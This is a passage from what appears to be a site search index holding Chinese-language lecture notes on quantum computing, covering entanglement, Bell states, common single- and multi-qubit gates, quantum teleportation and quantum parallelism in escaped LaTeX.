\u7684\u6982\u7387\u5f97\u5230 \\( \\left\\lvert 0 \\right\\rangle \\)\uff0c\u6d4b\u91cf\u4e4b\u540e\u91cf\u5b50\u6001\u574d\u7f29\u4e3a</p> \\[     \\left\\lvert \\varphi \\right\\rangle = \\frac{\\alpha_{00} \\left\\lvert 00 \\right\\rangle + \\alpha_{01} \\left\\lvert 01 \\right\\rangle}{\\sqrt{\\left\\lvert \\alpha_{00} \\right\\rvert^2 + \\left\\lvert \\alpha_{01} \\right\\rvert^2}} \\]"},{"location":"cs/quantum/chapter1/#_11","title":"\u5f20\u91cf\u79ef","text":"<p>\u53c8\u79f0 Kronecker \u79ef\uff0c\u5c06\u4e24\u4e2a\u5411\u91cf\u7a7a\u95f4\u7684\u5411\u91cf\u5408\u5e76\u6210\u4e00\u4e2a\u66f4\u5927\u7684\u5411\u91cf\u7a7a\u95f4\uff0c\u7b97\u7b26\u4e3a \\( \\otimes \\)\u3002</p>"},{"location":"cs/quantum/chapter1/#_12","title":"\u5224\u65ad\u662f\u5426\u7ea0\u7f20","text":"<p>\u4e24\u91cf\u5b50\u6bd4\u7279\u7684\u6001\u77e2\u91cf\u4e3a</p> \\[     \\left\\lvert \\varphi \\right\\rangle = \\alpha_{00} \\left\\lvert 00 \\right\\rangle + \\alpha_{01} \\left\\lvert 01 \\right\\rangle + \\alpha_{10} \\left\\lvert 10 \\right\\rangle + \\alpha_{11} \\left\\lvert 11 \\right\\rangle \\] <p>\u82e5\u4e24\u4e2a\u91cf\u5b50\u6bd4\u7279\u65e0\u5173\uff0c\u5219\u4e0d\u7ea0\u7f20\u3002\u4f8b\uff1a</p> <ul> <li>\\( \\left\\lvert \\varphi \\right\\rangle = \\alpha_{00} \\left\\lvert 00 \\right\\rangle + \\alpha_{11} \\left\\lvert 11 \\right\\rangle \\) \u4e3a\u7ea0\u7f20\u6001\uff0c\u6d4b\u91cf\u4e00\u4e2a\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\u4f1a\u5f71\u54cd\u53e6\u4e00\u4e2a\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\u3002</li> <li>\\( \\left\\lvert \\varphi \\right\\rangle = \\alpha \\left\\lvert 00 \\right\\rangle + \\alpha \\left\\lvert 01 \\right\\rangle = \\alpha \\left\\lvert 0 \\right\\rangle \\left( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle \\right) \\) \u4e3a\u975e\u7ea0\u7f20\u6001\u3002</li> </ul>"},{"location":"cs/quantum/chapter1/#_13","title":"\u8d1d\u5c14\u6001","text":"<p>\u8d1d\u5c14\u6001\u662f\u4e24\u91cf\u5b50\u6bd4\u7279\u7684\u7ea0\u7f20\u6001\u4e4b\u4e00\uff0c\u6709\u56db\u79cd\u5f62\u5f0f\uff1a</p> \\[     \\begin{aligned}         \\left\\lvert \\phi^+ \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 11 \\right\\rangle \\right) \\\\         \\left\\lvert \\phi^- \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 00 \\right\\rangle - \\left\\lvert 11 \\right\\rangle \\right) \\\\         \\left\\lvert \\psi^+ \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 01 \\right\\rangle + \\left\\lvert 10 \\right\\rangle \\right) \\\\         \\left\\lvert \\psi^- \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 01 \\right\\rangle - \\left\\lvert 10 \\right\\rangle \\right)     \\end{aligned} \\] <p>\\(\\{ \\left\\lvert \\phi^+ \\right\\rangle, \\left\\lvert \\phi^- \\right\\rangle, \\left\\lvert \\psi^+ \\right\\rangle, \\left\\lvert \\psi^- \\right\\rangle \\}\\) \u79f0\u4e3a\u8d1d\u5c14\u57fa\u3002</p>"},{"location":"cs/quantum/chapter1/#_14","title":"\u5355\u91cf\u5b50\u6bd4\u7279\u95e8","text":""},{"location":"cs/quantum/chapter1/#x","title":"X \u95e8","text":"<p>\u975e\u95e8\uff0c\u4f5c\u7528\u4e3a \\( X \\left\\lvert 0 \\right\\rangle = \\left\\lvert 1 \\right\\rangle \\) \u548c \\( X \\left\\lvert 1 \\right\\rangle = \\left\\lvert 0 \\right\\rangle \\)\u3002</p> <p>\u5bf9\u5e94\u77e9\u9635\u4e3a</p> \\[     X = \\begin{bmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix} \\]"},{"location":"cs/quantum/chapter1/#hadamard","title":"Hadamard \u95e8","text":"<p>\u53ef\u4ee5\u5c06\u57fa\u6001 \\( \\left\\lvert 0 \\right\\rangle \\) \u548c \\( \\left\\lvert 1 \\right\\rangle \\) \u5747\u5300\u5730\u6620\u5c04\u5230 \\( \\left\\lvert + \\right\\rangle \\) \u548c \\( \\left\\lvert - \\right\\rangle \\)\uff0c\u751f\u6210\u53e0\u52a0\u6001\u3002</p> <p>\u4f5c\u7528\u4e3a</p> \\[     \\begin{aligned}         H \\left\\lvert 0 \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle \\right) = \\left\\lvert + \\right\\rangle \\\\         H \\left\\lvert 1 \\right\\rangle &amp; = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle \\right) = \\left\\lvert - \\right\\rangle     \\end{aligned} \\] <p>\u5bf9\u5e94\u77e9\u9635\u4e3a</p> \\[     H = \\frac{1}{\\sqrt{2}} \\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; -1 \\end{bmatrix} \\] <p>H \u95e8\u7684\u5b9e\u8d28</p> <p>H \u95e8\u5b9e\u9645\u4e0a\u662f\u5b9e\u73b0\u5c06\u91cf\u5b50\u6001\u4ece z \u57fa\u5230 x \u57fa\u7684\u8f6c\u53d8\u3002</p> <p></p>"},{"location":"cs/quantum/chapter1/#_15","title":"\u6ce1\u5229\u95e8","text":"<p>Pauli \u95e8\u5305\u62ec X \u95e8\u3001Y \u95e8\u548c Z \u95e8\u3002</p> \\[     \\begin{aligned}         \\sigma_x &amp; = \\begin{bmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix} \\\\         \\sigma_y &amp; = \\begin{bmatrix} 0 &amp; -i \\\\ i &amp; 0 \\end{bmatrix} \\\\         \\sigma_z &amp; = \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; -1 \\end{bmatrix}     \\end{aligned} \\] <p>\u5206\u522b\u5bf9\u5e94\u4e8e Bloch \u7403\u4e0a\u7ed5 x\u3001y \u548c z \u8f74\u65cb\u8f6c \\( \\pi \\)\u3002</p> <p>\u91cf\u5b50\u95e8\u4e0e\u77e9\u9635\u4e58\u6cd5</p> <p>\u91cf\u5b50\u95e8\u5b9e\u8d28\u4e0a\u662f\u9149\u77e9\u9635\uff0c\u6ee1\u8db3 \\( UU^{\\dagger} = I \\)\uff0c\u6ee1\u8db3\u53ef\u9006\u548c\u6b63\u5219\u6027\u3002</p> <ul> <li>\u5384\u7c73\u77e9\u9635 \\( H = H^{\\dagger} \\)\uff0c\u4fdd\u8bc1\u5176\u672c\u5f81\u503c\u4e3a\u5b9e\u6570\u4e14\u672c\u5f81\u5411\u91cf\u6b63\u4ea4\uff0c\u786e\u4fdd\u4e86\u91cf\u5b50\u7cfb\u7edf\u7684\u7269\u7406\u91cf\u662f\u53ef\u89c2\u6d4b\u7684\u3002</li> <li>\u9149\u77e9\u9635 \\( UU^{\\dagger} = I \\)\uff0c\u4fdd\u6301\u5185\u79ef\u4e0d\u53d8\uff0c\u4fdd\u8bc1\u4e86\u91cf\u5b50\u6001\u7684\u5f52\u4e00\u6027\uff0c\u4fdd\u6301\u6001\u77e2\u91cf\u4e4b\u95f4\u7684\u6b63\u4ea4\u6027\u8d28\u3002</li> </ul>"},{"location":"cs/quantum/chapter1/#_16","title":"\u76f8\u4f4d\u65cb\u8f6c\u95e8","text":"<p>\u76f8\u4f4d\u65cb\u8f6c\u95e8\u4f5c\u7528\u4e8e\u91cf\u5b50\u6bd4\u7279\u7684\u6001\u77e2\u91cf\u65f6\uff0c\u4f1a\u5f15\u5165\u4e00\u4e2a\u7279\u5b9a\u7684\u76f8\u4f4d\u56e0\u5b50\uff0c\u6539\u53d8\u91cf\u5b50\u6001\u7684\u76f8\u5bf9\u76f8\u4f4d\uff1b\u5177\u4f53\u800c\u8a00\uff0c\u76f8\u4f4d\u7684\u65cb\u8f6c\u662f\u901a\u8fc7\u8c03\u6574\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\u77e2\u91cf\u4e0e\u67d0\u4e2a\u7279\u5b9a\u57fa\u6001\u7684\u76f8\u5bf9\u76f8\u4f4d\u6765\u5b9e\u73b0\u7684\u3002\u76f8\u4f4d\u65cb\u8f6c\u95e8\u53ef\u4ee5\u6539\u53d8\u91cf\u5b50\u6001\u7684\u76f8\u5bf9\u76f8\u4f4d\uff0c\u4f46\u4e0d\u6539\u53d8\u5176\u6982\u7387\u5206\u5e03\u3002</p> <p>\u5e38\u89c1\u7684\u76f8\u4f4d\u65cb\u8f6c\u95e8\u6709 P \u95e8\u3001T \u95e8\u3001S \u95e8\u3002</p> \\[     \\begin{aligned}         P(\\theta) &amp; = \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; e^{i \\theta} \\end{bmatrix} \\\\         T &amp; = \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; e^{i \\frac{\\pi}{4}} \\end{bmatrix} \\\\         S &amp; = \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; i \\end{bmatrix}     \\end{aligned} \\]"},{"location":"cs/quantum/chapter1/#_17","title":"\u53c2\u6570\u65cb\u8f6c\u95e8","text":"<p>\u5206\u522b\u7ed5 x\u3001y\u3001z \u8f74\u65cb\u8f6c\u89d2\u5ea6 \\( \\theta \\) \u7684\u65cb\u8f6c\u95e8\uff1a</p> \\[     \\begin{aligned}         R_x(\\theta) &amp; = \\begin{bmatrix} \\cos \\frac{\\theta}{2} &amp; -i \\sin \\frac{\\theta}{2} \\\\ -i \\sin \\frac{\\theta}{2} &amp; \\cos \\frac{\\theta}{2} \\end{bmatrix} \\\\         R_y(\\theta) &amp; = \\begin{bmatrix} \\cos \\frac{\\theta}{2} &amp; -\\sin \\frac{\\theta}{2} \\\\ \\sin \\frac{\\theta}{2} &amp; \\cos \\frac{\\theta}{2} \\end{bmatrix} \\\\         R_z(\\theta) &amp; = \\begin{bmatrix} e^{-i \\frac{\\theta}{2}} &amp; 0 \\\\ 0 &amp; e^{i \\frac{\\theta}{2}} \\end{bmatrix}     \\end{aligned} \\] <p>\u5bb9\u6613\u9a8c\u8bc1 \\( H = i R_y(\\frac{\\pi}{2}) R_z(\\pi) = i R_x(\\pi) R_y(\\frac{\\pi}{2}) \\)\u3002</p>"},{"location":"cs/quantum/chapter1/#_18","title":"\u5355\u91cf\u5b50\u6bd4\u7279\u95e8\u64cd\u4f5c\u5206\u89e3","text":"<p>\u4efb\u610f\u9149\u77e9\u9635\u90fd\u53ef\u4ee5\u5206\u89e3\u4e3a\uff1a</p> \\[     U = e^{i \\alpha}     \\begin{bmatrix}         e^{-i \\frac{\\beta}{2}} &amp; 0 \\\\         0 &amp; e^{i \\frac{\\beta}{2}}     \\end{bmatrix}     \\begin{bmatrix}         \\cos \\frac{\\gamma}{2} &amp; -\\sin \\frac{\\gamma}{2} \\\\         \\sin \\frac{\\gamma}{2} &amp; \\cos \\frac{\\gamma}{2}     \\end{bmatrix}     \\begin{bmatrix}         e^{-i \\frac{\\delta}{2}} &amp; 0 \\\\         0 &amp; e^{i \\frac{\\delta}{2}}     \\end{bmatrix} \\] <p>\u5206\u89e3\u4e3a\u7ed5 z \u8f74\u65cb\u8f6c \\( \\delta \\)\u3001\u7ed5 y \u8f74\u65cb\u8f6c \\( \\gamma \\)\u3001\u7ed5 z \u8f74\u65cb\u8f6c \\( \\beta \\) \u548c\u5168\u5c40\u76f8\u4f4d \\( e^{i \\alpha} \\)\u3002</p>"},{"location":"cs/quantum/chapter1/#_19","title":"\u591a\u91cf\u5b50\u95e8","text":""},{"location":"cs/quantum/chapter1/#_20","title":"\u7ea0\u7f20\u5224\u5b9a","text":"<p>\u5982\u679c\u4e00\u4e2a\u591a\u91cf\u5b50\u6bd4\u7279\u7cfb\u7edf\u53ef\u4ee5\u5206\u89e3\u4e3a\u591a\u4e2a\u5355\u91cf\u5b50\u6bd4\u7279\u7684\u5f20\u91cf\u79ef\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7cfb\u7edf\u88ab\u79f0\u4f5c\u65e0\u5173\u7684\u3001\u53ef\u5206\u7684\uff1b\u53cd\u4e4b\uff0c\u8be5\u7cfb\u7edf\u662f\u4e0d\u53ef\u5206\u7684\u3001\u7ea0\u7f20\u7684\u3002</p> <p>Example</p> <p>\u91cf\u5b50\u6001</p> \\[     \\left\\lvert \\varphi \\right\\rangle = \\frac{1}{2} \\left\\lvert 00 \\right\\rangle + \\frac{i}{2} \\left\\lvert 01 \\right\\rangle - \\frac{1}{2} \\left\\lvert 10 \\right\\rangle - \\frac{i}{2} \\left\\lvert 11 \\right\\rangle \\] <p>\u53ef\u4ee5\u5206\u89e3\u4e3a</p> \\[     \\left( \\frac{1}{\\sqrt{2}} \\left\\lvert 0 \\right\\rangle - \\frac{1}{\\sqrt{2}} \\left\\lvert 1 \\right\\rangle \\right) \\otimes \\left( \\frac{1}{\\sqrt{2}} \\left\\lvert 0 \\right\\rangle + \\frac{i}{\\sqrt{2}} \\left\\lvert 1 \\right\\rangle \\right) \\] <p>\u8bf4\u660e\u8be5\u91cf\u5b50\u6001\u662f\u53ef\u5206\u7684\u3002  </p>"},{"location":"cs/quantum/chapter1/#_21","title":"\u590d\u5408\u7cfb\u7edf","text":"<p>\u53ef\u4ee5\u5c06\u591a\u91cf\u5b50\u6bd4\u7279\u7cfb\u7edf\u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\uff0c\u79f0\u4e3a\u590d\u5408\u7cfb\u7edf\u3002</p> <p>Example</p> <p>\u53cc\u91cf\u5b50\u6001\u7cfb\u7edf\u5982\u4e0b\uff1a</p> <p></p> <p>\u82e5\u5c06\u4e24\u4e2a\u5355\u91cf\u5b50\u95e8\u89c6\u4f5c\u6574\u4f53\uff0c\u53ef\u4ee5\u901a\u8fc7\u5f20\u91cf\u79ef\u5408\u6210\u4e3a\u4e00\u4e2a\u53cc\u91cf\u5b50\u95e8</p> \\[     X \\otimes Z =     \\begin{bmatrix}         0 &amp; 1 \\\\         1 &amp; 0     \\end{bmatrix}     \\otimes     \\begin{bmatrix}         1 &amp; 0 \\\\         0 &amp; -1     \\end{bmatrix}     =     \\begin{bmatrix}         0 \\cdot \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; -1 \\end{bmatrix} &amp; 1 \\cdot \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; -1 \\end{bmatrix} \\\\         1 \\cdot \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; -1 \\end{bmatrix} &amp; 0 \\cdot \\begin{bmatrix} 1 &amp; 0 \\\\ 0 &amp; -1 \\end{bmatrix}     \\end{bmatrix}     =     \\begin{bmatrix}         0 &amp; 0 &amp; 1 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; -1 \\\\         1 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; -1 &amp; 0 &amp; 0     \\end{bmatrix} \\] <p>\u4f5c\u7528\u4e8e\u590d\u5408\u7cfb\u7edf\uff1a</p> \\[     X \\otimes Z \\left\\lvert 00 \\right\\rangle =     \\begin{bmatrix}         0 &amp; 0 &amp; 1 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; -1 \\\\         1 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; -1 &amp; 0 &amp; 0     \\end{bmatrix}     \\begin{bmatrix}         1 \\\\         0 \\\\         0 \\\\         0     \\end{bmatrix}     =     \\begin{bmatrix}         0 \\\\         0 \\\\         1 \\\\         0     \\end{bmatrix}     =     \\left\\lvert 10 \\right\\rangle \\]"},{"location":"cs/quantum/chapter1/#cnot","title":"CNOT \u95e8","text":"<p>CNOT \u95e8\u662f\u63a7\u5236\u975e\u95e8\uff0c\u4f5c\u7528\u4e8e\u4e24\u91cf\u5b50\u6bd4\u7279\u7cfb\u7edf\uff0c\u5f53\u63a7\u5236\u91cf\u5b50\u6bd4\u7279\u4e3a \\( \\left\\lvert 1 \\right\\rangle \\) \u65f6\uff0c\u5bf9\u76ee\u6807\u91cf\u5b50\u6bd4\u7279\u65bd\u52a0 X \u95e8\u3002</p> <p>\u5236\u5907\u7ea0\u7f20\u6001</p> \\[     \\begin{aligned}         \\left\\lvert 0 \\right\\rangle \\left\\lvert 0 \\right\\rangle &amp; \\xrightarrow{H \\otimes I} \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle \\right) \\left\\lvert 0 \\right\\rangle = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 10 \\right\\rangle \\right) \\\\         &amp; \\xrightarrow{\\text{CNOT gate}} \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 11 \\right\\rangle \\right)     \\end{aligned} \\]"},{"location":"cs/quantum/chapter1/#_22","title":"\u91cf\u5b50\u9690\u5f62\u4f20\u6001","text":"<p>\u5047\u8bbe\u6709\u5904\u4e8e\u8d1d\u5c14\u7ea0\u7f20\u6001\u7684\u53cc\u91cf\u5b50\u6bd4\u7279\u7cfb\u7edf</p> \\[     \\left\\lvert q_0 q_1\\right\\rangle = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 11 \\right\\rangle \\right) \\] <p>Alice \u62ff\u8d70\u4e86\u91cf\u5b50\u6bd4\u7279 \\( q_0 \\)\uff0cBob \u62ff\u8d70\u4e86\u91cf\u5b50\u6bd4\u7279 \\( q_1 \\)\u3002</p> <p>\u73b0\u5728 Alice \u60f3\u8981\u5c06\u4e00\u4e2a\u91cf\u5b50\u6001 \\( \\left\\lvert \\psi \\right\\rangle = \\alpha \\left\\lvert 0 \\right\\rangle + \\beta \\left\\lvert 1 \\right\\rangle \\) \u4f20\u8f93\u7ed9 Bob\u3002</p> <p>Alice \u548c Bob \u6301\u6709\u7684\u4e09\u4e2a\u91cf\u5b50\u6001\u6784\u6210\u7684\u521d\u59cb\u91cf\u5b50\u7cfb\u7edf\u4e3a</p> \\[     \\left\\lvert \\psi_0 \\right\\rangle = \\frac{1}{\\sqrt{2}} \\left( \\alpha \\left\\lvert 0 \\right\\rangle ( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 11 \\right\\rangle ) + \\beta \\left\\lvert 1 \\right\\rangle ( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 11 \\right\\rangle ) \\right) \\] <p>Alice \u9996\u5148\u5bf9 \\( \\left\\lvert \\psi \\right\\rangle \\) \u548c \\( q_0 \\) \u8fdb\u884c CNOT \u95e8\u64cd\u4f5c\uff0c\u5176\u4e2d \\( \\left\\lvert \\psi \\right\\rangle \\) \u4e3a\u63a7\u5236\u91cf\u5b50\u6bd4\u7279\uff0c\\( q_0 \\) \u4e3a\u76ee\u6807\u91cf\u5b50\u6bd4\u7279\uff0c\u91cf\u5b50\u7cfb\u7edf\u53d8\u4e3a</p> \\[     \\left\\lvert \\psi_1 \\right\\rangle = \\frac{1}{\\sqrt{2}} \\left( \\alpha \\left\\lvert 0 \\right\\rangle ( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 11 \\right\\rangle ) + \\beta \\left\\lvert 1 \\right\\rangle ( \\left\\lvert 10 \\right\\rangle + \\left\\lvert 01 \\right\\rangle ) \\right) \\] <p>\u7136\u540e Alice \u5bf9 \\( \\left\\lvert \\psi \\right\\rangle \\) \u8fdb\u884c Hadamard \u95e8\u64cd\u4f5c\uff0c\u91cf\u5b50\u7cfb\u7edf\u53d8\u4e3a</p> \\[     \\begin{aligned}     \\left\\lvert \\psi_2 \\right\\rangle &amp;= \\frac{1}{2} \\left( \\alpha ( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle ) ( \\left\\lvert 00 \\right\\rangle + \\left\\lvert 11 \\right\\rangle ) + \\beta ( \\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle ) ( \\left\\lvert 10 \\right\\rangle + \\left\\lvert 01 \\right\\rangle ) \\right) \\\\     &amp;= \\frac{1}{2} \\left( \\left\\lvert 00 \\right\\rangle ( \\alpha \\left\\lvert 0 \\right\\rangle + \\beta \\left\\lvert 1 \\right\\rangle ) + \\left\\lvert 01 \\right\\rangle ( \\alpha \\left\\lvert 1 \\right\\rangle + \\beta \\left\\lvert 0 \\right\\rangle ) + \\left\\lvert 10 \\right\\rangle ( \\alpha \\left\\lvert 0 \\right\\rangle - \\beta \\left\\lvert 1 \\right\\rangle ) + \\left\\lvert 11 \\right\\rangle ( \\alpha \\left\\lvert 1 \\right\\rangle - \\beta \\left\\lvert 0 \\right\\rangle ) \\right)     \\end{aligned} \\] <p>\u6b64\u65f6 Alice \u5bf9\u81ea\u5df1\u6301\u6709\u7684\u4e24\u4e2a\u91cf\u5b50\u6001\u8fdb\u884c\u6d4b\u91cf\uff0c\u6d4b\u91cf\u7ed3\u679c\u53ef\u80fd\u4e3a \\( \\left\\lvert 00 \\right\\rangle \\)\u3001\\( \\left\\lvert 01 \\right\\rangle \\)\u3001\\( \\left\\lvert 10 \\right\\rangle \\)\u3001\\( \\left\\lvert 11 \\right\\rangle \\) \u4e2d\u7684\u4e00\u4e2a\u3002Alice \u5c06\u81ea\u5df1\u7684\u6d4b\u91cf\u7ed3\u679c\u53d1\u9001\u7ed9 Bob\uff0cBob \u6839\u636e Alice \u7684\u6d4b\u91cf\u7ed3\u679c\u5bf9\u81ea\u5df1\u6301\u6709\u7684\u91cf\u5b50\u6001\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5f97 Bob \u6301\u6709\u7684\u91cf\u5b50\u6001\u4e0e Alice \u60f3\u8981\u4f20\u8f93\u7684\u91cf\u5b50\u6001\u76f8\u540c\u3002</p> <ul> <li>\u82e5 Alice \u7684\u6d4b\u91cf\u7ed3\u679c\u4e3a \\( \\left\\lvert 00 \\right\\rangle \\)\uff0c\u7531\u4e8e\u91cf\u5b50\u7ea0\u7f20\uff0cBob \u6301\u6709\u7684\u91cf\u5b50\u6001\u4e3a \\( \\alpha \\left\\lvert 0 \\right\\rangle + \\beta \\left\\lvert 1 \\right\\rangle \\)\uff0c\u5373 Alice \u60f3\u8981\u4f20\u8f93\u7684\u91cf\u5b50\u6001\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u64cd\u4f5c\u3002</li> <li>\u82e5 Alice \u7684\u6d4b\u91cf\u7ed3\u679c\u4e3a \\( \\left\\lvert 01 \\right\\rangle \\)\uff0cBob \u6301\u6709\u7684\u91cf\u5b50\u6001\u4e3a \\( \\alpha \\left\\lvert 1 \\right\\rangle + \\beta \\left\\lvert 0 \\right\\rangle \\)\uff0cBob \u9700\u8981\u5bf9\u81ea\u5df1\u6301\u6709\u7684\u91cf\u5b50\u6001\u8fdb\u884c X \u95e8\u64cd\u4f5c\u3002</li> <li>\u82e5 Alice \u7684\u6d4b\u91cf\u7ed3\u679c\u4e3a \\( \\left\\lvert 10 \\right\\rangle \\)\uff0cBob \u6301\u6709\u7684\u91cf\u5b50\u6001\u4e3a \\( \\alpha \\left\\lvert 0 \\right\\rangle - \\beta \\left\\lvert 1 \\right\\rangle \\)\uff0cBob \u9700\u8981\u5bf9\u81ea\u5df1\u6301\u6709\u7684\u91cf\u5b50\u6001\u8fdb\u884c Z \u95e8\u64cd\u4f5c\u3002</li> <li>\u82e5 Alice \u7684\u6d4b\u91cf\u7ed3\u679c\u4e3a \\( \\left\\lvert 11 \\right\\rangle \\)\uff0cBob \u6301\u6709\u7684\u91cf\u5b50\u6001\u4e3a \\( \\alpha \\left\\lvert 1 \\right\\rangle - \\beta \\left\\lvert 0 \\right\\rangle \\)\uff0cBob \u9700\u8981\u5bf9\u81ea\u5df1\u6301\u6709\u7684\u91cf\u5b50\u6001\u8fdb\u884c X \u95e8\u548c Z \u95e8\u64cd\u4f5c\u3002</li> </ul>"},{"location":"cs/quantum/chapter1/#swap-cswap","title":"SWAP \u95e8\u548c CSWAP \u95e8","text":"<p>SWAP \u95e8\u4ea4\u6362\u4e24\u4e2a\u91cf\u5b50\u6bd4\u7279\u7684\u72b6\u6001\uff0cCSWAP \u95e8\u5728 SWAP \u95e8\u7684\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u4e00\u4e2a\u63a7\u5236\u91cf\u5b50\u6bd4\u7279\u3002</p> \\[     \\mathrm{SWAP} =     \\begin{bmatrix}         1 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 1 &amp; 0 \\\\         0 &amp; 1 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; 1     \\end{bmatrix} \\] <p>Example</p> <p>\u4f5c\u7528\u4e8e\u4e24\u91cf\u5b50\u6bd4\u7279\u7cfb\u7edf \\( \\left\\lvert q_0 q_1 \\right\\rangle \\) \u4e0a\uff0c\u5176\u4e2d</p> \\[     \\left\\lvert q_0 \\right\\rangle = \\begin{bmatrix} \\alpha_1 \\\\ \\beta_1 \\end{bmatrix}, \\left\\lvert q_1 \\right\\rangle = \\begin{bmatrix} \\alpha_2 \\\\ \\beta_2 \\end{bmatrix} \\] <p>\u4f5c\u7528 SWAP \u95e8\u540e\uff0c\u91cf\u5b50\u7cfb\u7edf\u53d8\u4e3a</p> \\[     \\mathrm{SWAP} \\left\\lvert q_0 q_1 \\right\\rangle =     \\begin{bmatrix}         1 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 1 &amp; 0 \\\\         0 &amp; 1 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; 1     \\end{bmatrix}     \\begin{bmatrix}         \\alpha_1 \\alpha_2 \\\\         \\alpha_1 \\beta_2 \\\\         \\beta_1 \\alpha_2 \\\\         \\beta_1 \\beta_2     \\end{bmatrix}     =     \\begin{bmatrix}         \\alpha_1 \\alpha_2 \\\\         \\beta_1 \\alpha_2 \\\\         \\alpha_1 \\beta_2 \\\\         \\beta_1 \\beta_2     \\end{bmatrix}     = \\left\\lvert q_1 q_0 \\right\\rangle \\]"},{"location":"cs/quantum/chapter1/#toffoli","title":"Toffoli \u95e8","text":"<p>Toffoli \u95e8\u662f CCNOT \u95e8\uff0c\u4f5c\u7528\u4e8e\u4e09\u91cf\u5b50\u6bd4\u7279\u7cfb\u7edf\uff0c\u5f53\u4e24\u4e2a\u63a7\u5236\u91cf\u5b50\u6bd4\u7279\u5747\u4e3a \\( \\left\\lvert 1 \\right\\rangle \\) \u65f6\uff0c\u5bf9\u76ee\u6807\u91cf\u5b50\u6bd4\u7279\u65bd\u52a0 X \u95e8\u3002</p>"},{"location":"cs/quantum/chapter1/#_23","title":"\u91cf\u5b50\u7cfb\u7edf\u7684\u5e76\u884c\u6027","text":"<p>\u91cf\u5b50\u5e76\u884c\u6027\u662f\u91cf\u5b50\u8ba1\u7b97\u7684\u4e00\u4e2a\u57fa\u672c\u7279\u5f81\uff0c\u5b83\u4f7f\u5f97\u91cf\u5b50\u8ba1\u7b97\u673a\u53ef\u4ee5\u540c\u65f6\u8ba1\u7b97 \\(f(x)\\) \u5728\u591a\u4e2a \\(x\\) \u53d6\u503c\u4e0b\u7684\u51fd\u6570\u503c\u3002</p> <p>\u8bbe\u5b58\u5728\u4e00\u4e2a\u91cf\u5b50\u7535\u8def\u53ef\u4ee5\u5b9e\u73b0 \\(\\left\\lvert x, y \\right\\rangle \\rightarrow \\left\\lvert x, y \\oplus f(x) \\right\\rangle\\) \u7684\u53d8\u6362\uff0c\u5176\u4e2d \\(\\oplus\\) \u8868\u793a\u6a21 2 \u52a0\u6cd5\uff08\u5f02\u6216\u8fd0\u7b97\uff09\u3002</p> <p>\u90a3\u4e48\u82e5 \\(\\left\\lvert x \\right\\rangle = \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle \\right)\\) \u4e3a\u53e0\u52a0\u6001\uff0c\u4e14 \\(\\left\\lvert y \\right\\rangle = \\left\\lvert 0 \\right\\rangle\\)\uff0c\u5219\u7ecf\u8fc7\u8be5\u91cf\u5b50\u7535\u8def\u540e\uff0c\u91cf\u5b50\u6001\u53d8\u4e3a</p> \\[     \\frac{1}{\\sqrt{2}} \\left( \\left\\lvert 0, f(0) \\right\\rangle + \\left\\lvert 1, f(1) \\right\\rangle \\right) \\] <p>\u8fd9\u610f\u5473\u7740\u91cf\u5b50\u8ba1\u7b97\u673a\u53ef\u4ee5\u540c\u65f6\u8ba1\u7b97 \\(f(0)\\) \u548c \\(f(1)\\) \u7684\u503c\u3002</p> <p>\u82e5\u8f93\u5165 \\(x\\) \u4e3a\u591a\u91cf\u5b50\u6bd4\u7279\uff0c\u5219\u5bf9 \\(x\\) \u4e2d\u6bcf\u4e2a\u91cf\u5b50\u6bd4\u7279\u65bd\u52a0 Hadamard \u95e8\uff0c\u7136\u540e\u5bf9 \\(x\\) \u548c \\(y\\) 